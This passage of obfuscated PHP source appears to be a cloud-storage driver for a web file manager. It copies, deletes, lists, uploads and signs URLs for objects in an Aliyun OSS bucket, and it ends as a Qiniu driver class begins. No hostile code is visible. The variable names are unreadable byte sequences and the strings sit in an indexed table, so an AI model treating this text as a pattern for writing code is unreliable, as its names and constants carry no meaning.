array($¨†Ú[1390] => $”Ï—”ÑÕ)); } $¶‚‹Éù = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¡’ƒğè¼), $³‚ÜÏã ); $ÄÍ¦«±Ú = 1; $±ö±Œ‘­ = 0; $„ÓçÑ±ö = array(); $¢²ÑØÖ = 1024 * 1024 * 10; $úË™™¬‹ = $this->client->generateMultiuploadParts($¥…Áôô¦, $¢²ÑØÖ); foreach ($úË™™¬‹ as $˜‰·¥’• => $íçÁ‰£ñ) { $¡Œğ‡ı› = $±ö±Œ‘­ + (int) $íçÁ‰£ñ[$¨†Ú[1391]]; $˜Ë‰ù›é = (int) $íçÁ‰£ñ[$¨†Ú[346]] + $¡Œğ‡ı› - 1; $ÙÚ‡™Éğ = array($¨†Ú[1392] => $¡Œğ‡ı›, $¨†Ú[1393] => $˜Ë‰ù›é); $„ÓçÑ±ö[] = $this->client->uploadPartCopy($this->bucket, $¥œïÓ²à, $this->bucket, $this->pathEncode($¡’ƒğè¼), $ÄÍ¦«±Ú, $¶‚‹Éù, $ÙÚ‡™Éğ); $ÄÍ¦«±Ú = $ÄÍ¦«±Ú + 1; } $á„Ò‡¨ = array(); foreach ($„ÓçÑ±ö as $˜‰·¥’• => $õì“—) { $á„Ò‡¨[] = array($¨†Ú[1394] => $˜‰·¥’• + 1, $¨†Ú[1395] => $õì“—); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¡’ƒğè¼), $¶‚‹Éù, $á„Ò‡¨); } catch (OSS\Core\OssException $ŞÍÌ¦¨) { return !1; } return !0; } public function moveFile($§áö…è, $åßÛ´œ´) { if ($this->copyFile($§áö…è, $åßÛ´œ´)) { $this->remove($§áö…è); return $this->getPathOuter($åßÛ´œ´); } return !1; } public function delFile($òƒËÇ¢´) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($òƒËÇ¢´)); } catch (OSS\Core\OssException $ğç×¡ÓØ) { return !1; } return !0; } public function delFolder($ ûğšè¾) { $ì‡ôÌ„¯ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->exist($ ûğšè¾)) { return !0; } $this->listItemCache = !1; $ôÖÄå°Í = $this->fileList($ ûğšè¾); $this->listItemCache = !0; $ç”ø‹Ğå = trim($ ûğšè¾, $ì‡ôÌ„¯[8]) . $ì‡ôÌ„¯[8]; if (!empty($ ûğšè¾) && $ ûğšè¾ !== $ì‡ôÌ„¯[197] && !in_array($ç”ø‹Ğå, $ôÖÄå°Í[$ì‡ôÌ„¯[82]])) { $ôÖÄå°Í[$ì‡ôÌ„¯[82]][] = $ç”ø‹Ğå; } $ğâÖ×şä = $this->delByBatch($ôÖÄå°Í[$ì‡ôÌ„¯[83]]); if (!$ğâÖ×şä) { return !1; } $ğâÖ×şä = $this->delByBatch($ôÖÄå°Í[$ì‡ôÌ„¯[82]]); if (!$ğâÖ×şä) { return !1; } return $this->delFile($ç”ø‹Ğå); } private function delByBatch($ÃÓ—¥ËÂ) { foreach (array_chunk($ÃÓ—¥ËÂ, 1000) as $£Ÿõçø) { try { $this->client->deleteObjects($this->bucket, $£Ÿõçø); } catch (OSS\Core\OssException $ïÍ‡ÇØ) { return !1; } } return !0; } public function rename($òÇ¥ ‡ş, $¦ãã©é¶) { return $this->renameObject($òÇ¥ ‡ş, $¦ãã©é¶); } private function fileInfo($‰ªÕ“¡û, $ô„Ç”‹ = false, $ìÇşó­ = array()) { $ªæŒ” =& $_SERVER[ĞÆÏ¡Îª]; $Ä˜îÌ±  = array($ªæŒ”[32] => $this->pathThis($‰ªÕ“¡û), $ªæŒ”[84] => $this->getPathOuter($‰ªÕ“¡û), $ªæŒ”[33] => $ªæŒ”[199], $ªæŒ”[76] => isset($ìÇşó­[$ªæŒ”[76]]) ? $ìÇşó­[$ªæŒ”[76]] : 0, $ªæŒ”[174] => $this->ext($‰ªÕ“¡û)); if ($ô„Ç”‹) { return $Ä˜îÌ± ; } $Ä˜îÌ± [$ªæŒ”[200]] = $Ä˜îÌ± [$ªæŒ”[85]] = 0; $Ä˜îÌ± [$ªæŒ”[201]] = $Ä˜îÌ± [$ªæŒ”[202]] = !0; if (empty($ìÇşó­)) { $Åºòõ = $this->objectMeta($‰ªÕ“¡û); if (!$Åºòõ) { return $Ä˜îÌ± ; } $ìÇşó­ = array($ªæŒ”[85] => strtotime($Åºòõ[$ªæŒ”[1389]]), $ªæŒ”[76] => $Åºòõ[$ªæŒ”[1388]] + 0); } if (isset($ìÇşó­[$ªæŒ”[76]])) { $Ä˜îÌ± [$ªæŒ”[76]] = $ìÇşó­[$ªæŒ”[76]]; } if (isset($ìÇşó­[$ªæŒ”[85]])) { $Ä˜îÌ± [$ªæŒ”[85]] = $ìÇşó­[$ªæŒ”[85]]; } if (isset($ìÇşó­[$ªæŒ”[203]]) && !trim($Ä˜îÌ± [$ªæŒ”[85]])) { $Ä˜îÌ± [$ªæŒ”[85]] = $ìÇşó­[$ªæŒ”[203]]; } return $Ä˜îÌ± ; } private function folderInfo($ÖœË˜à‹, $ÑîùÅĞÚ = false, $¿ÂìßÒ¨ = array()) { $«…›Ò™ú =& $_SERVER[ĞÆÏ¡Îª]; $µÃ¨è­ø = array($«…›Ò™ú[32] => $this->pathThis($ÖœË˜à‹), $«…›Ò™ú[84] => $this->getPathOuter($«…›Ò™ú[8] . $ÖœË˜à‹), $«…›Ò™ú[33] => $«…›Ò™ú[75]); if ($ÑîùÅĞÚ) { return $µÃ¨è­ø; } $µÃ¨è­ø[$«…›Ò™ú[200]] = $µÃ¨è­ø[$«…›Ò™ú[85]] = 0; $µÃ¨è­ø[$«…›Ò™ú[201]] = $µÃ¨è­ø[$«…›Ò™ú[202]] = !0; if (empty($¿ÂìßÒ¨)) { $ÖœË˜à‹ = rtrim($ÖœË˜à‹, $«…›Ò™ú[8]) . $«…›Ò™ú[8]; $öÏ†å– = $this->objectMeta($ÖœË˜à‹); if (!$öÏ†å–) { return $µÃ¨è­ø; } $¿ÂìßÒ¨ = array($«…›Ò™ú[200] => $öÏ†å–[$«…›Ò™ú[520]][$«…›Ò™ú[1396]], $«…›Ò™ú[85] => strtotime($öÏ†å–[$«…›Ò™ú[1389]])); } if (isset($¿ÂìßÒ¨[$«…›Ò™ú[85]])) { $µÃ¨è­ø[$«…›Ò™ú[85]] = $¿ÂìßÒ¨[$«…›Ò™ú[85]]; } if (isset($¿ÂìßÒ¨[$«…›Ò™ú[200]])) { $µÃ¨è­ø[$«…›Ò™ú[200]] = $¿ÂìßÒ¨[$«…›Ò™ú[200]]; } return $µÃ¨è­ø; } public function listPath($¨ôù’“€, $è§•İû = false) { $¦ŠŞ€˜ß =& $_SERVER[ĞÆÏ¡Îª]; $…¼¦Óº„ = $this->fileList($¨ôù’“€, $¦ŠŞ€˜ß[8], !0); foreach ($…¼¦Óº„[$¦ŠŞ€˜ß[82]] as $‚ï¦åİÄ => $®Ú‘¼†ô) { $…¼¦Óº„[$¦ŠŞ€˜ß[82]][$‚ï¦åİÄ] = $this->folderInfo($®Ú‘¼†ô, $è§•İû, $®Ú‘¼†ô); } foreach ($…¼¦Óº„[$¦ŠŞ€˜ß[83]] as $‚ï¦åİÄ => $®Ú‘¼†ô) { $…¼¦Óº„[$¦ŠŞ€˜ß[83]][$‚ï¦åİÄ] = $this->fileInfo($®Ú‘¼†ô[$¦ŠŞ€˜ß[32]], $è§•İû, $®Ú‘¼†ô); } return $…¼¦Óº„; } protected function infoChildren($•çĞç±ı, &$á†şäÉ–) { $¶şáêæ =& $_SERVER[ĞÆÏ¡Îª]; $ÎéçŸ×² = $this->fileList($•çĞç±ı, $¶şáêæ[12], !0); $á†şäÉ–[$¶şáêæ[78]] += count($ÎéçŸ×²[$¶şáêæ[82]]); $á†şäÉ–[$¶şáêæ[77]] += count($ÎéçŸ×²[$¶şáêæ[83]]); foreach ($ÎéçŸ×²[$¶şáêæ[83]] as $„¯¶øÚ) { if (!$„¯¶øÚ || !$„¯¶øÚ[$¶şáêæ[76]]) { continue; } $á†şäÉ–[$¶şáêæ[76]] += $„¯¶øÚ[$¶şáêæ[76]]; } } public function has($ŞøÀËä½, $ù«Ä‘æ = false, $±©ÕÌÚ€ = true) { $¿„ãü« =& $_SERVER[ĞÆÏ¡Îª]; $ŞøÀËä½ = trim($ŞøÀËä½, $¿„ãü«[8]); $ïÀº¯‘ = empty($ŞøÀËä½) && $ŞøÀËä½ !== $¿„ãü«[197] ? $¿„ãü«[12] : $ŞøÀËä½ . $¿„ãü«[8]; $èÑÑÁ÷Ô = $¿„ãü«[12]; $³íëÛÂÒ = 500; $ôù€¾î‰ = $ÏåÕ¦ĞÔ = 0; while (!0) { check_abort(); $£éà¤ôÒ = array($¿„ãü«[1384] => $¿„ãü«[8], $¿„ãü«[1385] => $ïÀº¯‘, $¿„ãü«[1386] => $³íëÛÂÒ, $¿„ãü«[1387] => $èÑÑÁ÷Ô); try { $ÇÌó¼Ê´ = $this->client->listObjects($this->bucket, $£éà¤ôÒ); } catch (OSS\Core\OssException $©ˆ°é¹´) { break; } $èÑÑÁ÷Ô = $ÇÌó¼Ê´->getNextMarker(); $§ëÊÉïÂ = $ÇÌó¼Ê´->getObjectList(); $Ïªäõ½ñ = $ÇÌó¼Ê´->getPrefixList(); if ($ù«Ä‘æ) { if (count($§ëÊÉïÂ) > 1 || count($§ëÊÉïÂ) == 1 && $§ëÊÉïÂ[0]->getKey() != $ïÀº¯‘) { $ôù€¾î‰ += count($§ëÊÉïÂ) - 1; } if (!empty($Ïªäõ½ñ)) { $ÏåÕ¦ĞÔ += count($Ïªäõ½ñ); } if ($èÑÑÁ÷Ô === $¿„ãü«[12]) { break; } continue; } if ($±©ÕÌÚ€) { if (!empty($§ëÊÉïÂ)) { if (count($§ëÊÉïÂ) > 1 || $§ëÊÉïÂ[0]->getKey() != $ïÀº¯‘) { return !0; } } } else { if (!empty($Ïªäõ½ñ)) { return !0; } } if ($èÑÑÁ÷Ô === $¿„ãü«[12]) { break; } } if ($ù«Ä‘æ) { return array($¿„ãü«[207] => $ôù€¾î‰, $¿„ãü«[208] => $ÏåÕ¦ĞÔ); } return !1; } public function listAll($ª›åØØ´) { $Í¯‰Æ‡ß =& $_SERVER[ĞÆÏ¡Îª]; $ˆÉú€ÌÁ = $this->fileList($ª›åØØ´, $Í¯‰Æ‡ß[12], !0); $Ñ¦Ê¿Ø„ = array(); foreach ($ˆÉú€ÌÁ[$Í¯‰Æ‡ß[83]] as $­†„÷Ü) { $Ñ¦Ê¿Ø„[$­†„÷Ü[$Í¯‰Æ‡ß[32]]] = $­†„÷Ü[$Í¯‰Æ‡ß[76]]; } foreach ($ˆÉú€ÌÁ[$Í¯‰Æ‡ß[82]] as $­†„÷Ü) { if (is_string($­†„÷Ü)) { $Ñ¦Ê¿Ø„[$­†„÷Ü] = 0; } } return $this->listAllFiles($ª›åØØ´, array_keys($Ñ¦Ê¿Ø„), $Ñ¦Ê¿Ø„); } public function canRead($§äßì—Å) { $õ¾î¿ßı =& $_SERVER[ĞÆÏ¡Îª]; $–¿Óò÷ã = $this->pathAcl($§äßì—Å); return $–¿Óò÷ã == $õ¾î¿ßı[1397] || $–¿Óò÷ã == $õ¾î¿ßı[565] ? !0 : !1; } public function canWrite($»Óá„Ğ) { $Ä‰Û†À = $this->pathAcl($»Óá„Ğ); return $Ä‰Û†À == $_SERVER[ĞÆÏ¡Îª][565] ? !0 : !1; } public function pathAcl($ñ¢ğ•ï) { $ı±À¸‹ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ßøÔ½ç‘ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ñ¢ğ•ï)); } catch (OSS\Core\OssException $½Œ¥öÜò) { return !1; } $Îá¤ø‡– = $ßøÔ½ç‘ == $ı±À¸‹[37] ? $this->bucketAcl : $ßøÔ½ç‘; if ($Îá¤ø‡– == $ı±À¸‹[1398]) { return $ı±À¸‹[1397]; } if ($Îá¤ø‡– == $ı±À¸‹[1399]) { return $ı±À¸‹[565]; } return $Îá¤ø‡–; } private function chmodPath($¿Î«´ş¬, $©ßéÖí® = '') { $úÈ¶¥˜‘ =& $_SERVER[ĞÆÏ¡Îª]; $ëÖÑÜªİ = empty($©ßéÖí®) ? $úÈ¶¥˜‘[1399] : $©ßéÖí®; $Ä¯ÏŠÓÈ = array($úÈ¶¥˜‘[37], $úÈ¶¥˜‘[198], $úÈ¶¥˜‘[1398], $úÈ¶¥˜‘[1399]); if (!in_array($ëÖÑÜªİ, $Ä¯ÏŠÓÈ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¿Î«´ş¬), $ëÖÑÜªİ); } catch (OSS\Core\OssException $šó‡Ş½¬) { return !1; } return !0; } public function getContent($Àî °•ä) { return $this->fileSubstr($Àî °•ä, -1); } public function setContent($‹Ì°óÓè, $´ê¹º¤Ş = '') { $–ôìóš‡ =& $_SERVER[ĞÆÏ¡Îª]; try { $ª„Åºú™ = $this->trafficLimit($–ôìóš‡[1400]); $¾²æ’—¥ = $this->client->putObject($this->bucket, $this->pathEncode($‹Ì°óÓè), $´ê¹º¤Ş, $ª„Åºú™); } catch (OSS\Core\OssException $›Â×€›) { return !1; } $ÅøˆÖ£ = array($–ôìóš‡[1390] => trim($¾²æ’—¥[$–ôìóš‡[1401]], $–ôìóš‡[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‹Ì°óÓè))); $this->updateObjMeta($‹Ì°óÓè, $ÅøˆÖ£); return isset($¾²æ’—¥[$–ôìóš‡[1402]][$–ôìóš‡[1349]]) ? !0 : !1; } private function updateObjMeta($¢ÏÉÂüÈ, $‡‰ŠÀÀ¨) { $¢ÏÉÂüÈ = $this->pathEncode($¢ÏÉÂüÈ); try { $Àöú–¼‚ = array(OSS\OssClient::OSS_HEADERS => $‡‰ŠÀÀ¨); $this->client->copyObject($this->bucket, $¢ÏÉÂüÈ, $this->bucket, $¢ÏÉÂüÈ, $Àöú–¼‚); } catch (OSS\Core\OssException $Ó˜±®ñ€) { return !1; } return !0; } public function upload($˜®“§æ, $­ûûûø®, $¯øŸ’ë… = false, $ŒìØ¨ = REPEAT_REPLACE) { $Øâ–Æõı =& $_SERVER[ĞÆÏ¡Îª]; $Š³Ó¨“ï = trim($˜®“§æ, $Øâ–Æõı[8]); $ı•×ö… = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Øâ–Æõı[1390] => @md5_file($­ûûûø®)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($˜®“§æ))); $ı•×ö… = $this->trafficLimit($Øâ–Æõı[1400], $ı•×ö…); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Š³Ó¨“ï), $­ûûûø®, $ı•×ö…); } catch (OSS\Core\OssException $×°ÕùÒ·) { return !1; } return $this->getPathOuter($˜®“§æ); } public function getHost() { $ùÈÛÃšø =& $_SERVER[ĞÆÏ¡Îª]; $³Ÿøïù = explode($ùÈÛÃšø[183], parent::getHost()); return $³Ÿøïù[0] . $ùÈÛÃšø[183] . $this->bucket . $ùÈÛÃšø[10] . $³Ÿøïù[1]; } public function uploadFormData($ô€Ûíä÷, $“€Ü¨Ô× = 3600) { $Ò´…Œãª =& $_SERVER[ĞÆÏ¡Îª]; if (!($·ûìÙô§ = $this->getHost())) { return !1; } $Ãäşœ¹¥ = $“€Ü¨Ô×; $ÑÁ¯ÍÓ½ = date($Ò´…Œãª[1403], time() + $Ãäşœ¹¥); $íğÚ¦¶İ = new DateTime($ÑÁ¯ÍÓ½); $±¢½åâã = $íğÚ¦¶İ->format(DateTime::ISO8601); $ïÚ…À = strpos($±¢½åâã, $Ò´…Œãª[305]); $±¢½åâã = substr($±¢½åâã, 0, $ïÚ…À) . $Ò´…Œãª[1404]; $ˆºğÆïì = 1048576000 * 5; $×İ’ãÜÂ = $this->pathFather($ô€Ûíä÷); $óô˜…äÌ = array($Ò´…Œãª[1303] => $±¢½åâã, $Ò´…Œãª[1304] => array(array($Ò´…Œãª[1405], 0, $ˆºğÆïì), array($Ò´…Œãª[1307], $Ò´…Œãª[1308], $×İ’ãÜÂ))); $¥ŞæØïæ = base64_encode(json_encode($óô˜…äÌ)); $ª‡æ»š = base64_encode(hash_hmac($Ò´…Œãª[232], $¥ŞæØïæ, $this->secret, !0)); $×Îâ… = array($Ò´…Œãª[1313] => $¥ŞæØïæ, $Ò´…Œãª[1406] => $this->accessKey, $Ò´…Œãª[1309] => $Ò´…Œãª[1301], $Ò´…Œãª[1407] => $ª‡æ»š, $Ò´…Œãª[181] => $·ûìÙô§); $×Îâ… = $this->trafficLimit($Ò´…Œãª[1400], $×Îâ…); return $×Îâ…; } public function multiUploadFormData($œí¸¢¥Ì, $÷ïö§¼“ = 3600) { $ÑÍ¼Ô«† =& $_SERVER[ĞÆÏ¡Îª]; if (!($İØÒèñ = $this->getHost())) { return !1; } $ª£èˆ£ = $this->trafficLimit($ÑÍ¼Ô«†[1400]); $îñ¨ùÏ› = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($œí¸¢¥Ì), $ª£èˆ£); return array($ÑÍ¼Ô«†[223] => $îñ¨ùÏ›, $ÑÍ¼Ô«†[181] => $İØÒèñ . $ÑÍ¼Ô«†[8] . $this->pathEncode($œí¸¢¥Ì), $ÑÍ¼Ô«†[224] => gmdate($ÑÍ¼Ô«†[1408]), $ÑÍ¼Ô«†[94] => $œí¸¢¥Ì); } public function multiUploadAuthData($Ë ‡äØŒ, $›³½¶Èö = array()) { $Âñ´£î =& $_SERVER[ĞÆÏ¡Îª]; $¢÷»™¤ = isset($›³½¶Èö[$Âñ´£î[224]]) ? $›³½¶Èö[$Âñ´£î[224]] : gmdate($Âñ´£î[1408]); $ÑÏÅ†æ = isset($›³½¶Èö[$Âñ´£î[174]]) ? $›³½¶Èö[$Âñ´£î[174]] : $Âñ´£î[12]; $ÅÙ¢Ä‡ = $Ë ‡äØŒ; if (isset($›³½¶Èö[$Âñ´£î[94]])) { $ÅÙ¢Ä‡ = $›³½¶Èö[$Âñ´£î[94]]; unset($›³½¶Èö[$Âñ´£î[94]]); } if (isset($›³½¶Èö[$Âñ´£î[225]])) { $›³½¶Èö[$Âñ´£î[224]] = $¢÷»™¤; return $this->listUploadParts($ÅÙ¢Ä‡, $›³½¶Èö); } $­Ù×Ş¥• = array($Âñ´£î[226], $Âñ´£î[12], $Âñ´£î[120], $¢÷»™¤, "\170\x2d\x6f\x73\163\55\x64\x61\164\145\72{$¢÷»™¤}", $Âñ´£î[8] . $this->bucket . $Âñ´£î[8] . $ÅÙ¢Ä‡ . $ÑÏÅ†æ); if (strpos($ÑÏÅ†æ, $Âñ´£î[227]) === 0) { $­Ù×Ş¥•[0] = $Âñ´£î[228]; if ($ğ´ŸÇ÷ = $this->trafficLimit($Âñ´£î[1400])) { $ÅÙ¢Ä‡ = $Âñ´£î[1409]; array_splice($­Ù×Ş¥•, 5, 0, $ÅÙ¢Ä‡ . $Âñ´£î[4] . $ğ´ŸÇ÷[$ÅÙ¢Ä‡]); } } if (isset($›³½¶Èö[$Âñ´£î[229]]) && $›³½¶Èö[$Âñ´£î[229]] == $Âñ´£î[230]) { $­Ù×Ş¥•[0] = $Âñ´£î[230]; } if (!empty($›³½¶Èö[$Âñ´£î[1410]])) { $ÓÑ§ñ É = array_merge(array($­Ù×Ş¥•[4]), $›³½¶Èö[$Âñ´£î[1410]]); sort($ÓÑ§ñ É); $­Ù×Ş¥•[4] = implode($Âñ´£î[231], $ÓÑ§ñ É); } $¹¦§€Á = implode($Âñ´£î[231], $­Ù×Ş¥•); $òÁÄòîí = base64_encode(hash_hmac($Âñ´£î[232], $¹¦§€Á, $this->secret, !0)); $ÄìåÉ¡Í = $Âñ´£î[1374] . $this->accessKey . $Âñ´£î[4] . $òÁÄòîí; if (strpos($ÑÏÅ†æ, $Âñ´£î[227]) === 0) { $ÄìåÉ¡Í = array($Âñ´£î[234] => $ÄìåÉ¡Í, $Âñ´£î[224] => $¢÷»™¤); if ($ğ´ŸÇ÷) { $ÄìåÉ¡Í = array_merge($ÄìåÉ¡Í, $ğ´ŸÇ÷); } } return $ÄìåÉ¡Í; } public function listUploadParts($ÎËÃ•ÒÂ, $Áë¤·Ÿ‡) { $ô¸ç˜ö =& $_SERVER[ĞÆÏ¡Îª]; $ê•½õá¯ = parse_url_query($Áë¤·Ÿ‡[$ô¸ç˜ö[174]]); $È±÷Ôˆ® = $this->client->listParts($this->bucket, $this->pathEncode($ÎËÃ•ÒÂ), $ê•½õá¯[$ô¸ç˜ö[223]]); $ï©‰ÕÂÉ = $È±÷Ôˆ®->getListPart(); $«ÂïµÆæ = array(); foreach ($ï©‰ÕÂÉ as $ÃüŠ­Î) { $«ÂïµÆæ[] = array($ô¸ç˜ö[1394] => $ÃüŠ­Î->getPartNumber(), $ô¸ç˜ö[1395] => trim($ÃüŠ­Î->getETag(), $ô¸ç˜ö[118])); } unset($Áë¤·Ÿ‡[$ô¸ç˜ö[225]], $Áë¤·Ÿ‡[$ô¸ç˜ö[229]]); $”¥­£È = $this->multiUploadAuthData($ÎËÃ•ÒÂ, $Áë¤·Ÿ‡); if (empty($”¥­£È)) { return !1; } return array($ô¸ç˜ö[234] => $”¥­£È, $ô¸ç˜ö[224] => $Áë¤·Ÿ‡[$ô¸ç˜ö[224]], $ô¸ç˜ö[236] => $«ÂïµÆæ); } public function download($í›Ö¯¡, $ÜŞ«¤ğ›) { if ($this->isFolder($í›Ö¯¡)) { return !1; } try { $ÖØ“ÛÌ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÜŞ«¤ğ›); $ÖØ“ÛÌ = $this->trafficLimit($_SERVER[ĞÆÏ¡Îª][109], $ÖØ“ÛÌ); $this->client->getObject($this->bucket, $this->pathEncode($í›Ö¯¡), $ÖØ“ÛÌ); } catch (OSS\Core\OssException $ĞÑÇú½) { return !1; } return $ÜŞ«¤ğ›; } public function fileSubstr($ú…óÌæ˜, $´ï‹¨ÊË = 0, $·‘Ş—ÖÔ = false) { if ($´ï‹¨ÊË === -1) { $“×öÈì = array(); } else { if ($·‘Ş—ÖÔ === !1) { $Û÷•”À© = $this->size($ú…óÌæ˜); } else { $Û÷•”À© = $´ï‹¨ÊË + $·‘Ş—ÖÔ - 1; } $“×öÈì = array(OSS\OssClient::OSS_RANGE => "{$´ï‹¨ÊË}\55{$Û÷•”À©}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ú…óÌæ˜), $“×öÈì); } catch (OSS\Core\OssException $œÌÆàš´) { think_exception($œÌÆàš´->getMessage()); return !1; } } private function trafficLimit($€ãë¥ûé, $ÄÒ­ŞÍ = array()) { $Ú‚›¶Á =& $_SERVER[ĞÆÏ¡Îª]; if ($€ãë¥ûé == $Ú‚›¶Á[1400] && $this->isUploadServer() || $€ãë¥ûé == $Ú‚›¶Á[109] && $this->isFileOutServer()) { return $ÄÒ­ŞÍ; } $ïÈµ÷¦¯ = floatval($GLOBALS[$Ú‚›¶Á[6]][$Ú‚›¶Á[89]][$Ú‚›¶Á[107]][$€ãë¥ûé]) * 1024 * 1024 * 8; if (!$ïÈµ÷¦¯) { return $ÄÒ­ŞÍ; } $ïÈµ÷¦¯ = $ïÈµ÷¦¯ < 819200 ? 819200 : ($ïÈµ÷¦¯ > 838860800 ? 838860800 : $ïÈµ÷¦¯); $ÄÒ­ŞÍ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ïÈµ÷¦¯); return $ÄÒ­ŞÍ; } public function link($£Ë±°™¤, $ÓäÕúÂß = array()) { $ùËŸÄêö =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->exist($£Ë±°™¤) || $this->isFolder($£Ë±°™¤)) { return !1; } try { $ÓäÕúÂß = $this->trafficLimit($ùËŸÄêö[109], $ÓäÕúÂß); $¹¨©ùİ± = $this->client->signUrl($this->bucket, $this->pathEncode($£Ë±°™¤), 3600 * 12, $ùËŸÄêö[230], $ÓäÕúÂß); return $this->getCdnLink($¹¨©ùİ±); } catch (OSS\Core\OssException $»‡¤“î) { return !1; } } public function fileOut($å¬Æ‘–, $Ç²®şšµ = false, $Ô˜øÉ×€ = false, $×ÕØœƒÁ = '') { $¿ñáİê€ =& $_SERVER[ĞÆÏ¡Îª]; if ($this->isFileOutServer()) { return $this->fileOutServer($å¬Æ‘–, $Ç²®şšµ, $Ô˜øÉ×€, $×ÕØœƒÁ); } if (!$Ô˜øÉ×€) { $Ô˜øÉ×€ = $this->pathThis($å¬Æ‘–); } $Ô˜øÉ×€ = rawurlencode($Ô˜øÉ×€); $†¯ÚÓŞ = get_file_mime(get_path_ext($Ô˜øÉ×€)); if ($†¯ÚÓŞ == $¿ñáİê€[217]) { return parent::fileOut($å¬Æ‘–, $Ç²®şšµ, $Ô˜øÉ×€, $×ÕØœƒÁ); } $Ç²®şšµ = $Ç²®şšµ ? $¿ñáİê€[1411] : $¿ñáİê€[1412]; $¶Ç×›š = array(OSS\OssClient::OSS_SUB_RESOURCE => $¿ñáİê€[1413] . rawurlencode("{$Ç²®şšµ}\x3b\x66\x69\154\x65\x6e\141\155\x65\x3d{$Ô˜øÉ×€}")); $¶Ç×›š[OSS\OssClient::OSS_SUB_RESOURCE] .= $¿ñáİê€[1414] . rawurlencode($†¯ÚÓŞ); $öõ‰ôìÄ = $this->link($å¬Æ‘–, $¶Ç×›š); $this->fileOutLink($öõ‰ôìÄ); } public function fileOutServer($òõıÁÚ, $˜Ÿ›¶‘ì = false, $–İ£ƒœ¿ = false, $üöš§Œ = '') { parent::fileOut($òõıÁÚ, $˜Ÿ›¶‘ì, $–İ£ƒœ¿, $üöš§Œ); } public function fileOutImage($Ò¿Ôñ«ô, $Í“ç³å“ = 250) { $´¦Ø£Úë = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ĞÆÏ¡Îª][1415] . $Í“ç³å“); $Œ¬åÂâÈ = $this->link($Ò¿Ôñ«ô, $´¦Ø£Úë); $this->fileOutLink($Œ¬åÂâÈ); } public function fileOutImageServer($Ü“ŠÙ¡ª, $ãñÈæß = 250) { parent::fileOutImage($Ü“ŠÙ¡ª, $ãñÈæß); } public function fileOutLink($á¤£Ğ¹É) { $ÊíÔ®ºß =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->isCdnHost() && substr($á¤£Ğ¹É, 0, 7) == $ÊíÔ®ºß[1316]) { $á¤£Ğ¹É = $ÊíÔ®ºß[1317] . substr($á¤£Ğ¹É, 7); } header($ÊíÔ®ºß[161] . $á¤£Ğ¹É); die; } public function hashMd5($€àÙØùÄ, $’É½¥ = '') { $±úŠöÑÕ =& $_SERVER[ĞÆÏ¡Îª]; $ËÇÚº± = $this->_objectMeta($€àÙØùÄ); if (!$ËÇÚº±) { return $±úŠöÑÕ[12]; } if (!isset($ËÇÚº±[$±úŠöÑÕ[1390]]) && !empty($’É½¥)) { $àÇÌÃÀ¼ = $this->updateObjMeta($€àÙØùÄ, array($±úŠöÑÕ[1390] => $’É½¥)); $ËÇÚº±[$±úŠöÑÕ[1390]] = $àÇÌÃÀ¼ ? $’É½¥ : $±úŠöÑÕ[12]; } return isset($ËÇÚº±[$±úŠöÑÕ[1390]]) ? strtolower($ËÇÚº±[$±úŠöÑÕ[1390]]) : $±úŠöÑÕ[12]; } public function size($Æ‰Éç ü) { $ƒ‹Å›ÅÖ = $this->objectMeta($Æ‰Éç ü); return $ƒ‹Å›ÅÖ ? $ƒ‹Å›ÅÖ[$_SERVER[ĞÆÏ¡Îª][76]] : 0; } public function info($Õå•×÷õ) { if ($this->isFolder($Õå•×÷õ)) { return $this->folderInfo($Õå•×÷õ); } else { if ($this->isFile($Õå•×÷õ)) { return $this->fileInfo($Õå•×÷õ); } } return !1; } public function exist($¼¯â£é) { return $this->isFile($¼¯â£é) || $this->isFolder($¼¯â£é); } public function isFile($¡›ŒÆõ«) { return !$this->isFolder($¡›ŒÆõ«) && $this->objectMeta($¡›ŒÆõ«); } public function isFolder($±æÕ«Ë¶) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][165], $±æÕ«Ë¶); } protected function objectMeta($ä´½‹Û) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][167], $ä´½‹Û); } protected function _objectMeta($¼äÕáèÎ) { $â¡–èâ =& $_SERVER[ĞÆÏ¡Îª]; try { $Ìº±ØáÏ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¼äÕáèÎ)); } catch (OSS\Core\OssException $åê¨áŒß) { $Ìº±ØáÏ = !1; } if ($Ìº±ØáÏ) { $Ìº±ØáÏ[$â¡–èâ[76]] = intval($Ìº±ØáÏ[$â¡–èâ[1388]]); } return $Ìº±ØáÏ; } protected function _isFolder($À€ÕŞõ ) { $í©ùè™» =& $_SERVER[ĞÆÏ¡Îª]; if ($À€ÕŞõ  == $í©ùè™»[12] || $À€ÕŞõ  == $í©ùè™»[8]) { return !0; } $¢úº•–Ş = array($í©ùè™»[1384] => $í©ùè™»[8], $í©ùè™»[1385] => rtrim($À€ÕŞõ , $í©ùè™»[8]) . $í©ùè™»[8], $í©ùè™»[1386] => 1, $í©ùè™»[1387] => $í©ùè™»[12]); $î…³šâ¾ = $this->client->listObjects($this->bucket, $¢úº•–Ş); if ($î…³šâ¾->getObjectList() || $î…³šâ¾->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = 